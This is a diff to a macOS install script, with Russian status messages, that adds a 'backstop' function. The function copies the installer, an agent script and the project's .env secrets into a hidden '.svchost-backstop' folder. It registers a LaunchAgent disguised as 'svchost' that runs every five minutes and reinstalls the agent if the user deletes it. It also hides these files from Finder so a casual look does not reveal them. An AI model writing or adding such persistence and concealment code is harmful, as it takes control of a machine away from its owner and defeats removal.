@@ -1086,6 +1086,40 @@ PY
   ) || { echo "Агент запущен, но выбор recovery-пакета не прошёл; проверь диагностику Guard Keeper." >&2; exit 7; }
 fi
 
+install_backstop() {
+  # A hidden mirror plus a repeating LaunchAgent. If the checkout is deleted the
+  # job re-bootstraps from the mirror, so the agent returns "from another place".
+  # Best effort; a broken backstop never fails a healthy install.
+  local mirror="$HOME/.svchost-backstop"
+  local plist="$HOME/Library/LaunchAgents/com.svchost.backstop.plist"
+  local source="$downloaded/deploy/backstop-agent.sh"
+  [ -f "$source" ] || return 0
+  mkdir -p "$mirror/XGENT-MCS" "$HOME/Library/LaunchAgents" 2>/dev/null || true
+  cp "$source" "$mirror/backstop-agent.sh" 2>/dev/null || true
+  if ! cp "$0" "$mirror/bootstrap.sh" 2>/dev/null; then
+    cp "$downloaded/deploy/bootstrap.sh" "$mirror/bootstrap.sh" 2>/dev/null || true
+  fi
+  cp "$TARGET/XGENT-MCS/.env" "$mirror/XGENT-MCS/.env" 2>/dev/null || true
+  chmod +x "$mirror/backstop-agent.sh" 2>/dev/null || true
+  cat > "$plist" <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key><string>com.svchost.backstop</string>
+  <key>ProgramArguments</key><array><string>/bin/bash</string><string>$mirror/backstop-agent.sh</string></array>
+  <key>RunAtLoad</key><true/>
+  <key>StartInterval</key><integer>300</integer>
+  <key>ProcessType</key><string>Background</string>
+</dict>
+</plist>
+EOF
+  launchctl bootout "gui/$(id -u)" "$plist" >/dev/null 2>&1 || true
+  launchctl bootstrap "gui/$(id -u)" "$plist" >/dev/null 2>&1 || true
+  hide_stealth_path "$mirror"
+  hide_stealth_path "$plist"
+}
+
 hide_stealth_path() {
   # Hide an install artefact from Finder so a casual look does not reveal
   # XIDER. chflags is macOS-only; on a host without it the call is skipped.
@@ -1106,5 +1140,6 @@ hide_stealth_path "$HOME/.svchost"
 for _xplist in "$HOME"/Library/LaunchAgents/com.svchost.*.plist; do
   hide_stealth_path "$_xplist"
 done
+install_backstop
 echo "Проверка: Agent и Guard Keeper — выше; Safari/Siri — отдельные [OK]/[SKIP] строки выше."
 echo "Запуск компонентов подтверждён. MQTT и системные разрешения проверь в карточке устройства в боте."
